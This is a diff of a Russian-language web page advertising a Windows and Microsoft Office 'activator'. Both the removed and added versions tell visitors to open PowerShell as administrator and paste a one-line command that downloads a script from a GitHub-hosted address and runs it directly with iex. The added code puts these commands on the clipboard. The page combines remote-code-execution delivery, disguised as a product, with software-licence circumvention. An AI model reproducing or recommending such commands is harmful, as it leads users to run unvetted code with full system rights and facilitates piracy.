@@ -3,160 +3,144 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Активация Windows & MS Office</title>
+    <title>Активатор Windows & Office</title>
     <style>
-        * {
-            box-sizing: border-box;
-            margin: 0;
-            padding: 0;
-        }
         body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
             background-color: #0d1117;
             color: #c9d1d9;
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, Arial, sans-serif;
             display: flex;
             justify-content: center;
             align-items: center;
-            min-height: 100vh;
-            padding: 20px;
+            height: 100vh;
+            margin: 0;
         }
-        .container {
+        .card {
             background-color: #161b22;
             border: 1px solid #30363d;
-            border-radius: 12px;
-            padding: 40px 30px;
-            max-width: 550px;
-            width: 100%;
-            box-shadow: 0 8px 24px rgba(0, 0, 0, 0.3);
-        }
-        h1 {
-            color: #f0f6fc;
-            font-size: 22px;
-            font-weight: 600;
-            margin-bottom: 25px;
+            border-radius: 8px;
+            padding: 30px;
+            width: 450px;
             text-align: center;
+            box-shadow: 0 8px 24px rgba(0, 0, 0, 0.5);
         }
-        .steps {
+        h2 {
+            color: #f0f6fc;
+            margin-bottom: 5px;
+        }
+        .subtitle {
+            color: #8b949e;
+            font-size: 14px;
+            margin-bottom: 25px;
+        }
+        .buttons-container {
+            display: flex;
+            gap: 10px;
+            margin-bottom: 20px;
+        }
+        .btn-wrapper {
+            flex: 1;
             display: flex;
             flex-direction: column;
-            gap: 20px;
         }
-        .step {
-            background-color: #0d1117;
-            border: 1px solid #21262d;
-            border-radius: 8px;
-            padding: 16px;
-        }
-        .step-title {
-            color: #58a6ff;
-            font-size: 14px;
+        .btn-wrapper span {
+            font-size: 12px;
+            color: #8b949e;
+            margin-bottom: 6px;
             font-weight: 600;
-            text-transform: uppercase;
-            letter-spacing: 0.5px;
-            margin-bottom: 8px;
         }
-        .step-desc {
-            font-size: 15px;
-            line-height: 1.5;
-            color: #c9d1d9;
+        .btn {
+            background-color: #238636;
+            color: white;
+            border: none;
+            padding: 12px 10px;
+            border-radius: 6px;
+            font-size: 13px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: background-color 0.2s;
+            width: 100%;
         }
-        .step-desc strong {
-            color: #f0f6fc;
+        .btn:hover {
+            background-color: #2ea44f;
         }
-        .command-box {
-            display: flex;
-            background-color: #010409;
+        .btn.tui {
+            background-color: #1f6beb;
+        }
+        .btn.tui:hover {
+            background-color: #388bfd;
+        }
+        .instructions {
+            background-color: #0d1117;
             border: 1px solid #30363d;
             border-radius: 6px;
-            margin-top: 12px;
-            overflow: hidden;
-        }
-        .command-text {
-            font-family: ui-monospace, SFMono-Regular, SF Mono, Menlo, Consolas, Liberation Mono, monospace;
+            padding: 15px;
+            text-align: left;
             font-size: 13px;
-            color: #7ee787;
-            padding: 12px;
-            white-space: nowrap;
-            overflow-x: auto;
-            flex-grow: 1;
-            align-items: center;
-            display: flex;
         }
-        .copy-btn {
-            background-color: #21262d;
-            color: #c9d1d9;
-            border: none;
-            border-left: 1px solid #30363d;
-            padding: 0 16px;
-            font-family: inherit;
-            font-size: 13px;
-            font-weight: 500;
-            cursor: pointer;
-            transition: all 0.2s ease-in-out;
-            white-space: nowrap;
+        .instructions p {
+            margin: 0 0 8px 0;
+            color: #8b949e;
         }
-        .copy-btn:hover {
-            background-color: #238636;
-            color: #ffffff;
-            border-left-color: #238636;
+        .code-box {
+            background-color: #161b22;
+            border: 1px solid #30363d;
+            border-radius: 4px;
+            padding: 8px 10px;
+            font-family: monospace;
+            font-size: 11px;
+            color: #58a6ff;
+            word-break: break-all;
+            user-select: all;
         }
-        .copy-btn:active {
-            background-color: #2ea44f;
+        .footer {
+            margin-top: 20px;
+            font-size: 12px;
+            color: #484f58;
         }
     </style>
 </head>
 <body>
 
-<div class="container">
-    <h1>Активация Windows и Microsoft Office</h1>
-    
-    <div class="steps">
-        <div class="step">
-            <div class="step-title">Шаг 1</div>
-            <div class="step-desc">Скопируйте команду автоматического запуска для PowerShell:</div>
-            <div class="command-box">
-                <div class="command-text" id="cmdText">$c = (New-Object Net.WebClient).DownloadData('https://carplk.github.io/activator'); iex ([System.Text.Encoding]::UTF8.GetString($c))</div>
-                <button class="copy-btn" id="copyBtn" onclick="copyCode()">Копировать</button>
+    <div class="card">
+        <h2>Активатор Windows & Office</h2>
+        <div class="subtitle">Выберите удобный способ активации</div>
+
+        <div class="buttons-container">
+            <div class="btn-wrapper">
+                <span>GUI Версия</span>
+                <button class="btn" onclick="copyCommand('gui')">Копировать</button>
+            </div>
+            <div class="btn-wrapper">
+                <span>TUI Версия</span>
+                <button class="btn tui" onclick="copyCommand('tui')">Копировать</button>
             </div>
         </div>
 
-        <div class="step">
-            <div class="step-title">Шаг 2</div>
-            <div class="step-desc">Откройте терминал <strong>PowerShell</strong> от имени администратора (нажмите Пуск, введите <code>PowerShell</code>, кликните правой кнопкой мыши и выберите «Запуск от имени администратора»).</div>
+        <div class="instructions">
+            <p>1. Нажмите клавиши <b>Win + X</b> и выберите <b>Терминал (Администратор)</b> или <b>PowerShell (Администратор)</b>.</p>
+            <p>2. Вставьте скопированную команду и нажмите <b>Enter</b>:</p>
+            <div class="code-box" id="codeText">irm https://raw.githubusercontent.com/carplk/carplk.github.io/refs/heads/main/guiactivator | iex</div>
         </div>
 
-        <div class="step">
-            <div class="step-title">Шаг 3</div>
-            <div class="step-desc">Вставьте скопированную строку в окно PowerShell. <strong>Важно:</strong> сочетание клавиш <code>Ctrl + V</code> в консоли может не работать, поэтому для вставки просто нажмите <strong>правой кнопкой мыши (ПКМ)</strong> в любом месте окна терминала, а затем нажмите <strong>Enter</strong>.</div>
-        </div>
-
-        <div class="step">
-            <div class="step-title">Шаг 4</div>
-            <div class="step-desc">В появившемся текстовом меню введите <strong>цифру нужного пункта</strong> (например, 1 — для автоматической Windows или 2 — для MS Office) и нажмите <strong>Enter</strong>. Скрипт всё сделает сам!</div>
-        </div>
+        <div class="footer">Требуются права Администратора</div>
     </div>
-</div>
 
-<script>
-function copyCode() {
-    const textToCopy = document.getElementById('cmdText').innerText;
-    const btn = document.getElementById('copyBtn');
-    
-    navigator.clipboard.writeText(textToCopy).then(() => {
-        btn.innerText = 'Скопировано!';
-        btn.style.backgroundColor = '#238636';
-        btn.style.color = '#ffffff';
-        
-        setTimeout(() => {
-            btn.innerText = 'Копировать';
-            btn.style.backgroundColor = '';
-            btn.style.color = '';
-        }, 2000);
-    }).catch(err => {
-        console.error('Не удалось скопировать: ', err);
-    });
-}
-</script>
+    <script>
+        function copyCommand(type) {
+            let cmd = "";
+            if (type === 'gui') {
+                cmd = "irm https://raw.githubusercontent.com/carplk/carplk.github.io/refs/heads/main/guiactivator | iex";
+            } else {
+                cmd = "irm https://raw.githubusercontent.com/carplk/carplk.github.io/refs/heads/main/tuiactivator | iex";
+            }
+            
+            navigator.clipboard.writeText(cmd).then(() => {
+                document.getElementById('codeText').innerText = cmd;
+                alert("Команда скопирована в буфер обмена!");
+            });
+        }
+    </script>
 
 </body>
 </html>
